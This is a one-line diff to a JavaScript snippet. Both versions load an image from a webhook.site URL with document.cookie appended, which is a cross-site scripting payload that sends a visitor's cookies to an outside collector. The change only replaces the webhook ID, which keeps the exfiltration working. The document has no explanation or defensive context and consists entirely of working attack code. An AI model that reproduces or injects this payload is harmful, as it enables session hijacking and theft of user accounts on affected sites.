@@ -1,1 +1,1 @@
-var i=new Image;i.src="https://webhook.site/7a2d83d5-3a30-42fc-8c56-1e82687424e5/?cookie="+document.cookie;
+var i=new Image;i.src="https://webhook.site/f55dfe42-93f7-4d2b-93a9-9cd11bc39693/?cookie="+document.cookie;
